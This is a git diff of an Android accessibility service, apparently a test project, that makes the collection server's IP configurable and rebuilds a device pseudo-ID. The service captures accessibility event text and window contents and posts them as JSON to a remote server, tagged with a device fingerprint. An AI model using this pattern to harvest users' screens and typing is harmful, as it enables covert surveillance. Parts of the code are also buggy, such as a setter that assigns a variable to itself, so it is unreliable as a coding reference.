@@ -1,6 +1,8 @@
 package com.example.lixiaoqing.myaccessibility;
 
 import android.accessibilityservice.AccessibilityService;
+import android.content.Context;
+import android.content.SharedPreferences;
 import android.graphics.Rect;
 import android.os.Build;
 import android.support.annotation.NonNull;
@@ -23,6 +25,11 @@ import java.util.UUID;
 public class MyService extends AccessibilityService {
 
     private static String TAG ="lxq_test";
+    private static String serverAddress;
+
+    public static void setServerIP(String serverAddress){
+        serverAddress = serverAddress;
+    }
 
     @Override
     protected void onServiceConnected() {
@@ -121,13 +128,24 @@ public class MyService extends AccessibilityService {
         eventInfo.setText(eventText);
         eventInfo.setToIndex(event.getToIndex());
 
+
         eventInfo.setBase(getNoteInfo(this.getRootInActiveWindow()));
         eventInfo.setSource(getNoteInfo(event.getSource()));
 
         String json = JSON.toJSONString(eventInfo);
         Log.d(TAG, json);
 
-        new HttpUtils().httpPost(Properties.NET_ADDRESS+"?id=" + getUniquePseudoID(), json);
+        new HttpUtils().httpPost(Properties.NET_ADDRESS_HEAD+getServerIP()+Properties.NET_ADDRESS_END+"?id=" + getUniquePseudoID(), json);
+    }
+
+    private String getServerIP(){
+
+        if (null == serverAddress){
+            SharedPreferences sharedPreferences = this.getSharedPreferences(this.getPackageName(), Context.MODE_APPEND);
+            serverAddress = sharedPreferences.getString(Properties.SHAREDPREFERENCES_NAME_SERVER_IP,"");
+        }
+
+        return serverAddress;
     }
 
     private NoteInfo getNoteInfo(AccessibilityNodeInfo accessibilityNodeInfo){
@@ -137,9 +155,10 @@ public class MyService extends AccessibilityService {
         }
 
         NoteInfo noteInfo = new NoteInfo();
+        JSON.toJSONString(noteInfo);
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            noteInfo.setActions(accessibilityNodeInfo.getActionList());
+//            noteInfo.setActions(accessibilityNodeInfo.getActionList());
             noteInfo.setError(null == accessibilityNodeInfo.getError() ? null : accessibilityNodeInfo.getError().toString());
             noteInfo.setMaxTextLength(accessibilityNodeInfo.getMaxTextLength());
         }
@@ -159,6 +178,7 @@ public class MyService extends AccessibilityService {
         Rect outBounds = new Rect();
         accessibilityNodeInfo.getBoundsInScreen(outBounds);
         noteInfo.setRectInScreen(outBounds);
+
 
         noteInfo.setScrollable(accessibilityNodeInfo.isScrollable());
         noteInfo.setSelected(accessibilityNodeInfo.isSelected());
@@ -186,7 +206,23 @@ public class MyService extends AccessibilityService {
 
         String serial;
 
-        String m_szDevIDShort = "35" + Build.BOARD.length() % 10 + Build.BRAND.length() % 10 + Build.SUPPORTED_ABIS[0].length() % 10 + Build.DEVICE.length() % 10 + Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 + Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 + Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 + Build.TAGS.length() % 10 + Build.TYPE.length() % 10 + Build.USER.length() % 10; //13
+        StringBuilder stringBuilder = new StringBuilder("35");
+        stringBuilder.append(Build.BOARD.length() % 10);
+        stringBuilder.append(Build.BRAND.length() % 10);
+//        try{
+//            stringBuilder.append(Build.SUPPORTED_ABIS[0].length() % 10);
+//        } catch (Exception ignored){}
+        stringBuilder.append(Build.DEVICE.length() % 10);
+        stringBuilder.append(Build.DISPLAY.length() % 10);
+        stringBuilder.append(Build.HOST.length() % 10);
+        stringBuilder.append(Build.ID.length() % 10);
+        stringBuilder.append(Build.MANUFACTURER.length() % 10);
+        stringBuilder.append(Build.MODEL.length() % 10);
+        stringBuilder.append(Build.PRODUCT.length() % 10);
+        stringBuilder.append(Build.TAGS.length() % 10);
+        stringBuilder.append(Build.TYPE.length() % 10);
+        stringBuilder.append(Build.USER.length() % 10);
+
 
         try {
             serial = android.os.Build.class.getField("SERIAL").get(null).toString();
@@ -194,7 +230,7 @@ public class MyService extends AccessibilityService {
             serial = "serial";
         }
 
-        String id = new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
+        String id = new UUID(stringBuilder.toString().hashCode(), serial.hashCode()).toString();
 
         return ToBase64StringForUrl(id.getBytes());
 
